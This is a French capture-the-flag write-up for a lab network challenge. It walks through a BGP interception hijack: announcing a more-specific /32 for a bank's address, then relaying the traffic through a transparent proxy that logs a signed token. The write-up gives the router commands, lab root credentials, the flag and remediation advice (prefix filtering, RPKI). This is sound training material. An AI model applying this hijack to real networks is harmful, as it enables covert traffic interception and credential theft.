# Writeup — route-detournee

**Catégorie :** réseau · **Niveau :** intermédiaire
**Flag :** `FPS{bgp_hijack_more_specific_intercepte_le_trafic}`

## Topologie

```
 client(AS65020) ── transit(AS65000) ── victime/banque(AS65010)  198.51.100.10
      203.0.113.20        │
                          └── attaquant(AS65002) ── (lien latéral) ── victime
                               vous (SSH:1345)        172.16.0.1
```

Le client envoie en boucle un jeton signé à `198.51.100.10` (préfixe
`198.51.100.0/24` annoncé par la banque).

## Attaque — BGP hijack d'interception

BGP préfère toujours le **préfixe le plus spécifique**. En annonçant un `/32`
pour l'IP de la banque depuis votre AS, tout le trafic vers `198.51.100.10` est
attiré chez vous.

Sur le routeur AS65002 (`ssh root@<hôte> -p 1345`, `Hijack2026`) :

```
# lier localement l'IP cible (pour la recevoir et l'annoncer)
ip link add hj type dummy; ip addr add 198.51.100.10/32 dev hj; ip link set hj up

# annoncer le /32 (CLI type Cisco)
vtysh
  configure terminal
  router bgp 65002
   address-family ipv4 unicast
    network 198.51.100.10/32
  end

# interception TRANSPARENTE : réémission vers le vrai service (lien latéral)
python3 /root/mitm.py        # écoute :80, journalise le jeton, relaie vers 172.16.0.1
```

`show ip bgp 198.51.100.10/32` sur le transit confirme que votre `/32` (AS65002)
est préféré. Le prochain battement du client arrive alors sur votre proxy :

```
[INTERCEPTE] client=AS65020&token=FPS{bgp_hijack_more_specific_intercepte_le_trafic}
```

Le proxy relaie vers la vraie banque (172.16.0.1) : le client continue de
recevoir des **HTTP 200**, l'interception reste **transparente**.

`solve.py <hôte> 1345` automatise tout (laisser le proxy tourner dans une
session interactive pour maintenir la transparence).

## Remédiation

- Filtrage des préfixes (prefix-lists, max-prefix) entre AS, **RPKI/ROA** pour
  valider l'origine, communautés et IRR.
- Surveillance des annonces plus-spécifiques inattendues (BGP monitoring).

## Infra (prérequis hôte)

FRR dans des conteneurs ⇒ sur l'hôte, une fois :
`sysctl -w vm.overcommit_memory=1` et
`sysctl -w net.bridge.bridge-nf-call-iptables=0` (cf. `defi/README-infra.txt`).
Limites par conteneur : 0,3 CPU / 256 Mo / 256 pids.
